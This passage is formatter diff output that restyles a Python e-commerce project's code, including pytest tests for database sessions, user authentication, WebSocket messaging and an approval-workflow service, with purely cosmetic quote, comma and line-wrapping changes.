-        declining_features = sum(1 for metrics in adoption_metrics.values() if metrics["adoption_status"] == "declining")
-        
+        growing_features = sum(
+            1
+            for metrics in adoption_metrics.values()
+            if metrics["adoption_status"] == "growing"
+        )
+        declining_features = sum(
+            1
+            for metrics in adoption_metrics.values()
+            if metrics["adoption_status"] == "declining"
+        )
+
         if growing_features > declining_features:
             return "growing"
         elif declining_features > growing_features:
             return "declining"
         else:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/subscription/usage_analytics_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/test_database_operations.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/test_database_operations.py	2025-06-19 04:04:13.201956+00:00
@@ -24,165 +24,157 @@
 class TestDatabaseConnection:
     """
     AGENT_CONTEXT: Test database connection and session management
     AGENT_CAPABILITY: Connection pooling, session lifecycle, error handling
     """
-    
+
     @pytest.fixture
     def mock_database_url(self):
         """Mock database URL for testing"""
         return "postgresql+asyncpg://test:test@localhost:5432/test_flipsync"
-    
+
     @pytest.mark.asyncio
     async def test_database_initialization(self, mock_database_url):
         """Test database initialization"""
-        with patch('fs_agt_clean.core.db.database.create_async_engine') as mock_engine:
+        with patch("fs_agt_clean.core.db.database.create_async_engine") as mock_engine:
             mock_engine.return_value = AsyncMock()
-            
+
             db = Database(mock_database_url)
-            
+
             assert db.database_url == mock_database_url
             mock_engine.assert_called_once()
-    
+
     @pytest.mark.asyncio
     async def test_session_management(self, mock_database_url):
         """Test database session creation and management"""
-        with patch('fs_agt_clean.core.db.database.create_async_engine') as mock_engine:
+        with patch("fs_agt_clean.core.db.database.create_async_engine") as mock_engine:
             mock_engine_instance = AsyncMock()
             mock_engine.return_value = mock_engine_instance
-            
+
             db = Database(mock_database_url)
-            
+
             # Test session context manager
             async with db.get_session() as session:
                 assert session is not None
                 # Session should be properly configured
-                assert hasattr(session, 'execute')
-                assert hasattr(session, 'commit')
-                assert hasattr(session, 'rollback')
-    
+                assert hasattr(session, "execute")
+                assert hasattr(session, "commit")
+                assert hasattr(session, "rollback")
+
     @pytest.mark.asyncio
     async def test_connection_error_handling(self, mock_database_url):
         """Test database connection error handling"""
-        with patch('fs_agt_clean.core.db.database.create_async_engine') as mock_engine:
+        with patch("fs_agt_clean.core.db.database.create_async_engine") as mock_engine:
             mock_engine.side_effect = Exception("Connection failed")
-            
+
             with pytest.raises(Exception) as exc_info:
                 Database(mock_database_url)
-            
+
             assert "Connection failed" in str(exc_info.value)
 
 
 class TestAuthUserModel:
     """
     AGENT_CONTEXT: Test AuthUser model operations
     AGENT_CAPABILITY: User creation, password management, token generation
     """
-    
+
     def test_user_creation(self):
         """Test creating a new user"""
         user = AuthUser(
             email="test@flipsync.com",
             username="testuser",
             password="TestPassword123!",
             first_name="Test",
-            last_name="User"
-        )
-        
+            last_name="User",
+        )
+
         assert user.email == "test@flipsync.com"
         assert user.username == "testuser"
         assert user.first_name == "Test"
         assert user.last_name == "User"
         assert user.is_active is True
         assert user.is_verified is False
         assert user.hashed_password != "TestPassword123!"  # Should be hashed
-    
+
     def test_password_hashing_and_verification(self):
         """Test password hashing and verification"""
         password = "SecurePassword123!"
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password=password
-        )
-        
+            email="test@flipsync.com", username="testuser", password=password
+        )
+
         # Password should be hashed
         assert user.hashed_password != password
         assert len(user.hashed_password) > 50
-        
+
         # Verification should work
         assert user.verify_password(password) is True
         assert user.verify_password("WrongPassword") is False
-    
+
     def test_email_verification_workflow(self):
         """Test email verification token generation and validation"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         # Generate verification token
         token = user.generate_verification_token()
         assert token is not None
         assert len(token) > 20
         assert user.email_verification_token == token
         assert user.email_verification_expires is not None
-        
+
         # Validate token
         assert user.is_verification_token_valid(token) is True
         assert user.is_verification_token_valid("invalid_token") is False
-        
+
         # Verify email
         user.verify_email()
         assert user.is_verified is True
         assert user.email_verification_token is None
-    
+
     def test_password_reset_workflow(self):
         """Test password reset token generation and validation"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="OldPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="OldPassword123!"
+        )
+
         # Generate reset token
         reset_token = user.generate_password_reset_token()
         assert reset_token is not None
         assert user.password_reset_token == reset_token
         assert user.password_reset_expires is not None
-        
+
         # Validate token
         assert user.is_password_reset_token_valid(reset_token) is True
-        
+
         # Reset password
         user.set_password("NewPassword456!")
         assert user.verify_password("NewPassword456!") is True
         assert user.verify_password("OldPassword123!") is False
-    
+
     def test_login_attempt_tracking(self):
         """Test login attempt tracking and account locking"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         # Initial state
         assert user.failed_login_attempts == 0
         assert user.is_locked() is False
-        
+
         # Failed attempts
         for i in range(5):
             user.update_login_failure()
             if i < 4:
                 assert user.is_locked() is False
-        
+
         # Should be locked after 5 failures
         assert user.failed_login_attempts == 5
         assert user.is_locked() is True
-        
+
         # Successful login resets counter
         user.update_login_success()
         assert user.failed_login_attempts == 0
         assert user.is_locked() is False
         assert user.last_login is not None
@@ -191,143 +183,146 @@
 class TestAuthRepository:
     """
     AGENT_CONTEXT: Test authentication repository operations
     AGENT_CAPABILITY: User CRUD, authentication, role management
     """
-    
+
     @pytest.fixture
     def mock_session(self):
         """Mock database session"""
         session = AsyncMock(spec=AsyncSession)
         return session
-    
+
     @pytest.mark.asyncio
     async def test_create_user(self, mock_session):
         """Test user creation through repository"""
         repo = AuthRepository(mock_session)
-        
+
         user = await repo.create_user(
             email="newuser@flipsync.com",
             username="newuser",
             password="NewPassword123!",
             first_name="New",
-            last_name="User"
-        )
-        
+            last_name="User",
+        )
+
         assert user.email == "newuser@flipsync.com"
         assert user.username == "newuser"
         mock_session.add.assert_called_once()
         mock_session.commit.assert_called_once()
         mock_session.refresh.assert_called_once()
-    
+
     @pytest.mark.asyncio
     async def test_get_user_by_email(self, mock_session):
         """Test retrieving user by email"""
         repo = AuthRepository(mock_session)
-        
+
         # Mock user
         mock_user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         # Mock query result
         mock_result = AsyncMock()
         mock_result.scalar_one_or_none.return_value = mock_user
         mock_session.execute.return_value = mock_result
-        
+
         user = await repo.get_user_by_email("test@flipsync.com")
-        
+
         assert user == mock_user
         mock_session.execute.assert_called_once()
-    
+
     @pytest.mark.asyncio
     async def test_authenticate_user(self, mock_session):
         """Test user authentication through repository"""
         repo = AuthRepository(mock_session)
-        
+
         # Mock user with correct password
         mock_user = AuthUser(
             email="test@flipsync.com",
             username="testuser",
-            password="CorrectPassword123!"
-        )
-        
+            password="CorrectPassword123!",
+        )
+
         # Mock query result
         mock_result = AsyncMock()
         mock_result.scalar_one_or_none.return_value = mock_user
         mock_session.execute.return_value = mock_result
-        
+
         # Test successful authentication
-        success, user = await repo.authenticate_user("test@flipsync.com", "CorrectPassword123!")
-        
+        success, user = await repo.authenticate_user(
+            "test@flipsync.com", "CorrectPassword123!"
+        )
+
         assert success is True
         assert user == mock_user
-        
+
         # Test failed authentication
-        success, user = await repo.authenticate_user("test@flipsync.com", "WrongPassword")
-        
+        success, user = await repo.authenticate_user(
+            "test@flipsync.com", "WrongPassword"
+        )
+
         assert success is False
         assert user is None
-    
+
     @pytest.mark.asyncio
     async def test_update_last_login(self, mock_session):
         """Test updating user's last login timestamp"""
         repo = AuthRepository(mock_session)
-        
-        user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+
+        user = AuthUser(
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         old_last_login = user.last_login
         await repo.update_last_login(user)
-        
+
         assert user.last_login != old_last_login
         assert user.last_login is not None
         mock_session.commit.assert_called_once()
 
 
 class TestMarketRepository:
     """
     AGENT_CONTEXT: Test market repository operations
     AGENT_CAPABILITY: Product management, pricing, competitive analysis
     """
-    
+
     @pytest.fixture
     def mock_session(self):
         """Mock database session"""
         session = AsyncMock(spec=AsyncSession)
         return session
-    
+
     @pytest.mark.asyncio
     async def test_create_product(self, mock_session):
         """Test product creation through market repository"""
         repo = MarketRepository()
-        
+
         # Mock product identifier
-        from fs_agt_clean.core.models.marketplace_models import ProductIdentifier, MarketplaceType
-        
+        from fs_agt_clean.core.models.marketplace_models import (
+            ProductIdentifier,
+            MarketplaceType,
+        )
+
         product_id = ProductIdentifier(
-            asin="B123456789",
-            sku="TEST-SKU-001",
-            internal_id="PROD-001"
-        )
-        
-        with patch('fs_agt_clean.database.repositories.market_repository.ProductModel') as mock_model:
+            asin="B123456789", sku="TEST-SKU-001", internal_id="PROD-001"
+        )
+
+        with patch(
+            "fs_agt_clean.database.repositories.market_repository.ProductModel"
+        ) as mock_model:
             mock_product = MagicMock()
             mock_model.return_value = mock_product
-            
+
             result = await repo.create_product(
                 session=mock_session,
                 product_id=product_id,
                 title="Test Product",
-                marketplace=MarketplaceType.AMAZON
+                marketplace=MarketplaceType.AMAZON,
             )
-            
+
             mock_session.add.assert_called_once()
             mock_session.commit.assert_called_once()
 
 
 if __name__ == "__main__":
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/test_database_operations.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/test_websocket_manager.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/test_websocket_manager.py	2025-06-19 04:04:13.220938+00:00
@@ -7,18 +7,21 @@
 import asyncio
 import json
 from unittest.mock import Mock, AsyncMock, patch
 from datetime import datetime, timezone
 
-from fs_agt_clean.core.websocket.manager import websocket_manager, EnhancedWebSocketManager
+from fs_agt_clean.core.websocket.manager import (
+    websocket_manager,
+    EnhancedWebSocketManager,
+)
 from fs_agt_clean.core.websocket.events import (
-    create_message_event, 
-    create_typing_event, 
+    create_message_event,
+    create_typing_event,
     create_agent_status_event,
-    SenderType, 
+    SenderType,
     AgentType,
-    EventType
+    EventType,
 )
 
 
 class TestWebSocketManager:
     """Test cases for WebSocket Manager functionality."""
@@ -45,29 +48,31 @@
         assert manager.user_connections == {}
 
     def test_get_connection_stats(self, manager):
         """Test connection statistics retrieval."""
         stats = manager.get_connection_stats()
-        
+
         assert isinstance(stats, dict)
-        assert 'total_connections' in stats
-        assert 'active_connections' in stats
-        assert 'messages_sent' in stats
-        assert 'messages_received' in stats
-        assert 'disconnections' in stats
-        assert 'conversations' in stats
-        assert 'users' in stats
-        assert 'subscriptions' in stats
+        assert "total_connections" in stats
+        assert "active_connections" in stats
+        assert "messages_sent" in stats
+        assert "messages_received" in stats
+        assert "disconnections" in stats
+        assert "conversations" in stats
+        assert "users" in stats
+        assert "subscriptions" in stats
 
     @pytest.mark.asyncio
     async def test_connect_client(self, manager, mock_websocket):
         """Test connecting a WebSocket client."""
         client_id = "test_client_1"
         user_id = "test_user_1"
         conversation_id = "test_conv_1"
 
-        connection = await manager.connect(mock_websocket, client_id, user_id, conversation_id)
+        connection = await manager.connect(
+            mock_websocket, client_id, user_id, conversation_id
+        )
 
         assert client_id in manager.active_connections
         assert manager.active_connections[client_id] == connection
         assert connection.user_id == user_id
         assert conversation_id in manager.conversation_connections
@@ -103,15 +108,17 @@
         # Create test message
         message_event = create_message_event(
             conversation_id=conversation_id,
             message_id="test_msg_1",
             content="Test message",
-            sender=SenderType.USER
+            sender=SenderType.USER,
         )
 
         # Send message to conversation
-        sent_count = await manager.send_to_conversation(conversation_id, message_event.model_dump())
+        sent_count = await manager.send_to_conversation(
+            conversation_id, message_event.model_dump()
+        )
 
         # Verify message was sent
         assert sent_count == 1
         mock_websocket.send_text.assert_called()
 
@@ -124,15 +131,12 @@
         # Setup connection
         await manager.connect(mock_websocket, client_id, user_id)
 
         # Create test message
         test_message = {
-            'type': 'system_alert',
-            'data': {
-                'message': 'Test alert for user',
-                'level': 'info'
-            }
+            "type": "system_alert",
+            "data": {"message": "Test alert for user", "level": "info"},
         }
 
         # Send to user
         sent_count = await manager.send_to_user(user_id, test_message)
 
@@ -152,11 +156,11 @@
         # Create agent status event
         agent_status_event = create_agent_status_event(
             agent_id="test_agent_1",
             agent_type=AgentType.EXECUTIVE,
             status="active",
-            metrics={"health_score": 95.5, "effectiveness": 87.2}
+            metrics={"health_score": 95.5, "effectiveness": 87.2},
         )
 
         # Broadcast agent status
         sent_count = await manager.broadcast(agent_status_event.model_dump())
 
@@ -176,25 +180,25 @@
 
         # Simulate WebSocket error
         mock_websocket.send_text.side_effect = Exception("Connection lost")
 
         # Try to send message (should handle error gracefully)
-        test_message = {'type': 'test', 'data': {}}
+        test_message = {"type": "test", "data": {}}
         result = await manager.send_to_client(client_id, test_message)
 
         # Send should fail and connection should be cleaned up
         assert result is False
         assert client_id not in manager.active_connections
 
     def test_singleton_manager(self):
         """Test that websocket_manager is a singleton."""
         from fs_agt_clean.core.websocket.manager import websocket_manager
-        
+
         # Get manager instance multiple times
         manager1 = websocket_manager
         manager2 = websocket_manager
-        
+
         # Should be the same instance
         assert manager1 is manager2
 
     @pytest.mark.asyncio
     async def test_latency_requirement(self, manager, mock_websocket):
@@ -211,11 +215,11 @@
 
         message_event = create_message_event(
             conversation_id=conversation_id,
             message_id="latency_test_msg",
             content="Latency test message",
-            sender=SenderType.USER
+            sender=SenderType.USER,
         )
 
         await manager.send_to_conversation(conversation_id, message_event.model_dump())
 
         end_time = asyncio.get_event_loop().time()
@@ -247,14 +251,16 @@
         # Create and send message
         message = create_message_event(
             conversation_id=conversation_id,
             message_id="integration_msg_1",
             content="Integration test message",
-            sender=SenderType.USER
-        )
-
-        sent_count = await manager.send_to_conversation(conversation_id, message.model_dump())
+            sender=SenderType.USER,
+        )
+
+        sent_count = await manager.send_to_conversation(
+            conversation_id, message.model_dump()
+        )
 
         # Verify delivery
         assert sent_count == 1
         mock_ws.send_text.assert_called()
 
@@ -279,14 +285,16 @@
         message = create_message_event(
             conversation_id="multi_conv",
             message_id="multi_msg_1",
             content="Message to multiple users",
             sender=SenderType.AGENT,
-            agent_type=AgentType.EXECUTIVE
-        )
-
-        sent_count = await manager.send_to_conversation("multi_conv", message.model_dump())
+            agent_type=AgentType.EXECUTIVE,
+        )
+
+        sent_count = await manager.send_to_conversation(
+            "multi_conv", message.model_dump()
+        )
 
         # Verify all connections received the message
         assert sent_count == 3
         for mock_ws in connections:
             mock_ws.send_text.assert_called()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/test_websocket_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/workflow/approval_workflow_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/workflow/approval_workflow_service.py	2025-06-19 04:04:13.266514+00:00
@@ -23,27 +23,30 @@
 logger = logging.getLogger(__name__)
 
 
 class ApprovalStatus(str, Enum):
     """Approval workflow status."""
+
     PENDING = "pending"
     APPROVED = "approved"
     REJECTED = "rejected"
     TIMEOUT = "timeout"
     CANCELLED = "cancelled"
 
 
 class ApprovalPriority(str, Enum):
     """Approval priority levels."""
+
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     URGENT = "urgent"
 
 
 class ApprovalType(str, Enum):
     """Types of approval requests."""
+
     LISTING_PUBLISH = "listing_publish"
     BULK_OPERATION = "bulk_operation"
     PRICE_CHANGE = "price_change"
     CATEGORY_CHANGE = "category_change"
     MARKETPLACE_SYNC = "marketplace_sync"
@@ -51,11 +54,11 @@
     SUBSCRIPTION_CHANGE = "subscription_change"
 
 
 class ApprovalRequest:
     """Approval request model."""
-    
+
     def __init__(
         self,
         request_id: str,
         requester_id: str,
         approval_type: ApprovalType,
@@ -63,11 +66,11 @@
         description: str,
         data: Dict[str, Any],
         approvers: List[str],
         priority: ApprovalPriority = ApprovalPriority.MEDIUM,
         timeout_minutes: int = 60,
-        requires_all_approvers: bool = False
+        requires_all_approvers: bool = False,
     ):
         self.request_id = request_id
         self.requester_id = requester_id
         self.approval_type = approval_type
         self.title = title
@@ -75,24 +78,24 @@
         self.data = data
         self.approvers = approvers
         self.priority = priority
         self.timeout_minutes = timeout_minutes
         self.requires_all_approvers = requires_all_approvers
-        
+
         # Status tracking
         self.status = ApprovalStatus.PENDING
         self.created_at = datetime.now(timezone.utc)
         self.timeout_at = self.created_at + timedelta(minutes=timeout_minutes)
         self.completed_at: Optional[datetime] = None
-        
+
         # Approval tracking
         self.approvals: Dict[str, Dict[str, Any]] = {}  # approver_id -> approval_data
         self.rejections: Dict[str, Dict[str, Any]] = {}  # approver_id -> rejection_data
-        
+
         # Metadata
         self.metadata = {}
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "request_id": self.request_id,
             "requester_id": self.requester_id,
@@ -105,116 +108,121 @@
             "timeout_minutes": self.timeout_minutes,
             "requires_all_approvers": self.requires_all_approvers,
             "status": self.status.value,
             "created_at": self.created_at.isoformat(),
             "timeout_at": self.timeout_at.isoformat(),
-            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
+            "completed_at": (
+                self.completed_at.isoformat() if self.completed_at else None
+            ),
             "approvals": self.approvals,
             "rejections": self.rejections,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
-    
+
     def is_approved(self) -> bool:
         """Check if request is approved."""
         if self.requires_all_approvers:
             return len(self.approvals) == len(self.approvers)
         else:
             return len(self.approvals) > 0
-    
+
     def is_rejected(self) -> bool:
         """Check if request is rejected."""
         if self.requires_all_approvers:
             return len(self.rejections) > 0  # Any rejection blocks approval
         else:
             return len(self.rejections) >= len(self.approvers) - len(self.approvals)
-    
+
     def is_expired(self) -> bool:
         """Check if request has expired."""
         return datetime.now(timezone.utc) > self.timeout_at
 
 
 class ApprovalWorkflowService:
     """
     Approval workflow service with real-time notifications.
-    
+
     This service provides:
     - Multi-step approval process management
     - Real-time WebSocket notifications
     - Approval request tracking and persistence
     - Timeout handling and escalation
     """
-    
+
     def __init__(self):
         """Initialize the approval workflow service."""
         self.active_requests: Dict[str, ApprovalRequest] = {}
         self.completed_requests: Dict[str, ApprovalRequest] = {}
-        
+
         # Background task for timeout monitoring
         self._timeout_task: Optional[asyncio.Task] = None
         self._start_timeout_monitor()
-        
+
         logger.info("Approval Workflow Service initialized")
-    
+
     def _start_timeout_monitor(self):
         """Start background task to monitor timeouts."""
         try:
             self._timeout_task = asyncio.create_task(self._monitor_timeouts())
         except Exception as e:
             logger.error(f"Error starting timeout monitor: {e}")
-    
+
     async def _monitor_timeouts(self):
         """Monitor approval request timeouts."""
         while True:
             try:
                 await asyncio.sleep(60)  # Check every minute
-                
+
                 expired_requests = []
                 for request_id, request in self.active_requests.items():
-                    if request.is_expired() and request.status == ApprovalStatus.PENDING:
+                    if (
+                        request.is_expired()
+                        and request.status == ApprovalStatus.PENDING
+                    ):
                         expired_requests.append(request_id)
-                
+
                 for request_id in expired_requests:
                     await self._handle_timeout(request_id)
-                    
+
             except asyncio.CancelledError:
                 break
             except Exception as e:
                 logger.error(f"Error in timeout monitor: {e}")
-    
+
     async def create_approval_request(
         self,
         requester_id: str,
         approval_type: ApprovalType,
         title: str,
         description: str,
         data: Dict[str, Any],
         approvers: List[str],
         priority: ApprovalPriority = ApprovalPriority.MEDIUM,
         timeout_minutes: int = 60,
-        requires_all_approvers: bool = False
+        requires_all_approvers: bool = False,
     ) -> str:
         """
         Create a new approval request.
-        
+
         Args:
             requester_id: ID of the user requesting approval
             approval_type: Type of approval request
             title: Request title
             description: Request description
             data: Request data and context
             approvers: List of approver user IDs
             priority: Request priority
             timeout_minutes: Timeout in minutes
             requires_all_approvers: Whether all approvers must approve
-            
+
         Returns:
             Request ID
         """
         try:
             # Generate request ID
             request_id = str(uuid4())
-            
+
             # Create approval request
             request = ApprovalRequest(
                 request_id=request_id,
                 requester_id=requester_id,
                 approval_type=approval_type,
@@ -222,275 +230,298 @@
                 description=description,
                 data=data,
                 approvers=approvers,
                 priority=priority,
                 timeout_minutes=timeout_minutes,
-                requires_all_approvers=requires_all_approvers
+                requires_all_approvers=requires_all_approvers,
             )
-            
+
             # Store request
             self.active_requests[request_id] = request
-            
+
             # Notify approvers via WebSocket
             await self._notify_approval_request_created(request)
-            
-            logger.info(f"Created approval request: {request_id} for {approval_type.value}")
+
+            logger.info(
+                f"Created approval request: {request_id} for {approval_type.value}"
+            )
             return request_id
-            
+
         except Exception as e:
             logger.error(f"Error creating approval request: {e}")
             return ""
-    
+
     async def approve_request(
         self,
         request_id: str,
         approver_id: str,
         comments: Optional[str] = None,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> bool:
         """
         Approve an approval request.
-        
+
         Args:
             request_id: Request ID
             approver_id: ID of the approver
             comments: Optional approval comments
             metadata: Optional approval metadata
-            
+
         Returns:
             True if approval was successful
         """
         try:
             request = self.active_requests.get(request_id)
             if not request:
                 logger.warning(f"Approval request not found: {request_id}")
                 return False
-            
+
             # Check if user is authorized to approve
             if approver_id not in request.approvers:
-                logger.warning(f"User {approver_id} not authorized to approve {request_id}")
-                return False
-            
+                logger.warning(
+                    f"User {approver_id} not authorized to approve {request_id}"
+                )
+                return False
+
             # Check if already approved by this user
             if approver_id in request.approvals:
-                logger.warning(f"Request {request_id} already approved by {approver_id}")
-                return False
-            
+                logger.warning(
+                    f"Request {request_id} already approved by {approver_id}"
+                )
+                return False
+
             # Check if request is still pending
             if request.status != ApprovalStatus.PENDING:
-                logger.warning(f"Request {request_id} is not pending (status: {request.status})")
-                return False
-            
+                logger.warning(
+                    f"Request {request_id} is not pending (status: {request.status})"
+                )
+                return False
+
             # Record approval
             request.approvals[approver_id] = {
                 "approved_at": datetime.now(timezone.utc).isoformat(),
                 "comments": comments,
-                "metadata": metadata or {}
+                "metadata": metadata or {},
             }
-            
+
             # Check if request is now fully approved
             if request.is_approved():
                 request.status = ApprovalStatus.APPROVED
                 request.completed_at = datetime.now(timezone.utc)
-                
+
                 # Move to completed requests
                 self.completed_requests[request_id] = request
                 del self.active_requests[request_id]
-                
+
                 # Notify completion
                 await self._notify_approval_completed(request)
             else:
                 # Notify partial approval
                 await self._notify_approval_progress(request, approver_id, "approved")
-            
+
             logger.info(f"Request {request_id} approved by {approver_id}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error approving request: {e}")
             return False
-    
+
     async def reject_request(
         self,
         request_id: str,
         approver_id: str,
         reason: str,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> bool:
         """
         Reject an approval request.
-        
+
         Args:
             request_id: Request ID
             approver_id: ID of the approver
             reason: Rejection reason
             metadata: Optional rejection metadata
-            
+
         Returns:
             True if rejection was successful
         """
         try:
             request = self.active_requests.get(request_id)
             if not request:
                 logger.warning(f"Approval request not found: {request_id}")
                 return False
-            
+
             # Check if user is authorized to reject
             if approver_id not in request.approvers:
-                logger.warning(f"User {approver_id} not authorized to reject {request_id}")
-                return False
-            
+                logger.warning(
+                    f"User {approver_id} not authorized to reject {request_id}"
+                )
+                return False
+
             # Check if already rejected by this user
             if approver_id in request.rejections:
-                logger.warning(f"Request {request_id} already rejected by {approver_id}")
-                return False
-            
+                logger.warning(
+                    f"Request {request_id} already rejected by {approver_id}"
+                )
+                return False
+
             # Check if request is still pending
             if request.status != ApprovalStatus.PENDING:
-                logger.warning(f"Request {request_id} is not pending (status: {request.status})")
-                return False
-            
+                logger.warning(
+                    f"Request {request_id} is not pending (status: {request.status})"
+                )
+                return False
+
             # Record rejection
             request.rejections[approver_id] = {
                 "rejected_at": datetime.now(timezone.utc).isoformat(),
                 "reason": reason,
-                "metadata": metadata or {}
+                "metadata": metadata or {},
             }
-            
+
             # Check if request is now rejected
             if request.is_rejected():
                 request.status = ApprovalStatus.REJECTED
                 request.completed_at = datetime.now(timezone.utc)
-                
+
                 # Move to completed requests
                 self.completed_requests[request_id] = request
                 del self.active_requests[request_id]
-                
+
                 # Notify rejection
                 await self._notify_approval_rejected(request)
             else:
                 # Notify partial rejection
                 await self._notify_approval_progress(request, approver_id, "rejected")
-            
+
             logger.info(f"Request {request_id} rejected by {approver_id}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error rejecting request: {e}")
             return False
-    
+
     async def _handle_timeout(self, request_id: str):
         """Handle approval request timeout."""
         try:
             request = self.active_requests.get(request_id)
             if not request:
                 return
-            
+
             request.status = ApprovalStatus.TIMEOUT
             request.completed_at = datetime.now(timezone.utc)
-            
+
             # Move to completed requests
             self.completed_requests[request_id] = request
             del self.active_requests[request_id]
-            
+
             # Notify timeout
             await self._notify_approval_timeout(request)
-            
+
             logger.info(f"Request {request_id} timed out")
-            
+
         except Exception as e:
             logger.error(f"Error handling timeout: {e}")
-    
+
     async def _notify_approval_request_created(self, request: ApprovalRequest):
         """Notify approvers of new approval request - DISABLED."""
         # WebSocket notifications temporarily disabled
-        logger.info(f"Would notify approval request created: {request.request_id} (WebSocket disabled)")
-    
+        logger.info(
+            f"Would notify approval request created: {request.request_id} (WebSocket disabled)"
+        )
+
     async def _notify_approval_progress(
-        self,
-        request: ApprovalRequest,
-        approver_id: str,
-        action: str
+        self, request: ApprovalRequest, approver_id: str, action: str
     ):
         """Notify of approval progress - DISABLED."""
         # WebSocket notifications temporarily disabled
-        logger.info(f"Would notify approval progress: {request.request_id} - {action} by {approver_id} (WebSocket disabled)")
-    
+        logger.info(
+            f"Would notify approval progress: {request.request_id} - {action} by {approver_id} (WebSocket disabled)"
+        )
+
     async def _notify_approval_completed(self, request: ApprovalRequest):
         """Notify of approval completion - DISABLED."""
         # WebSocket notifications temporarily disabled
-        logger.info(f"Would notify approval completed: {request.request_id} (WebSocket disabled)")
+        logger.info(
+            f"Would notify approval completed: {request.request_id} (WebSocket disabled)"
+        )
 
     async def _notify_approval_rejected(self, request: ApprovalRequest):
         """Notify of approval rejection - DISABLED."""
         # WebSocket notifications temporarily disabled
-        logger.info(f"Would notify approval rejected: {request.request_id} (WebSocket disabled)")
+        logger.info(
+            f"Would notify approval rejected: {request.request_id} (WebSocket disabled)"
+        )
 
     async def _notify_approval_timeout(self, request: ApprovalRequest):
         """Notify of approval timeout - DISABLED."""
         # WebSocket notifications temporarily disabled
-        logger.info(f"Would notify approval timeout: {request.request_id} (WebSocket disabled)")
-    
+        logger.info(
+            f"Would notify approval timeout: {request.request_id} (WebSocket disabled)"
+        )
+
     def get_request(self, request_id: str) -> Optional[ApprovalRequest]:
         """Get approval request by ID."""
-        return (
-            self.active_requests.get(request_id) or 
-            self.completed_requests.get(request_id)
-        )
-    
+        return self.active_requests.get(request_id) or self.completed_requests.get(
+            request_id
+        )
+
     def get_user_requests(
-        self, 
-        user_id: str, 
-        include_completed: bool = False
+        self, user_id: str, include_completed: bool = False
     ) -> List[ApprovalRequest]:
         """Get approval requests for a user."""
         requests = []
-        
+
         # Active requests
         for request in self.active_requests.values():
             if user_id in request.approvers or user_id == request.requester_id:
                 requests.append(request)
-        
+
         # Completed requests if requested
         if include_completed:
             for request in self.completed_requests.values():
                 if user_id in request.approvers or user_id == request.requester_id:
                     requests.append(request)
-        
+
         return sorted(requests, key=lambda r: r.created_at, reverse=True)
-    
+
     def get_workflow_stats(self) -> Dict[str, Any]:
         """Get workflow statistics."""
         return {
             "active_requests": len(self.active_requests),
             "completed_requests": len(self.completed_requests),
             "total_requests": len(self.active_requests) + len(self.completed_requests),
-            "timeout_monitor_running": self._timeout_task is not None and not self._timeout_task.done(),
+            "timeout_monitor_running": self._timeout_task is not None
+            and not self._timeout_task.done(),
             "request_types": self._get_request_type_stats(),
-            "priority_distribution": self._get_priority_stats()
+            "priority_distribution": self._get_priority_stats(),
         }
-    
+
     def _get_request_type_stats(self) -> Dict[str, int]:
         """Get request type statistics."""
         stats = {}
-        all_requests = list(self.active_requests.values()) + list(self.completed_requests.values())
-        
+        all_requests = list(self.active_requests.values()) + list(
+            self.completed_requests.values()
+        )
+
         for request in all_requests:
             request_type = request.approval_type.value
             stats[request_type] = stats.get(request_type, 0) + 1
-        
+
         return stats
-    
+
     def _get_priority_stats(self) -> Dict[str, int]:
         """Get priority distribution statistics."""
         stats = {}
-        all_requests = list(self.active_requests.values()) + list(self.completed_requests.values())
-        
+        all_requests = list(self.active_requests.values()) + list(
+            self.completed_requests.values()
+        )
+
         for request in all_requests:
             priority = request.priority.value
             stats[priority] = stats.get(priority, 0) + 1
-        
+
         return stats
 
 
 # Global approval workflow service instance
 approval_workflow_service = ApprovalWorkflowService()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/workflow/approval_workflow_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/test_auth_system.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/test_auth_system.py	2025-06-19 04:04:13.398739+00:00
@@ -21,169 +21,159 @@
 class TestAuthUser:
     """
     AGENT_CONTEXT: Test AuthUser model functionality
     AGENT_CAPABILITY: Password hashing, verification, token generation
     """
-    
+
     def test_user_creation_with_password_hashing(self):
         """Test user creation automatically hashes password"""
         password = "TestPassword123!"
         user = AuthUser(
             email="test@flipsync.com",
             username="testuser",
             password=password,
             first_name="Test",
-            last_name="User"
-        )
-        
+            last_name="User",
+        )
+
         # Password should be hashed, not stored in plain text
         assert user.hashed_password != password
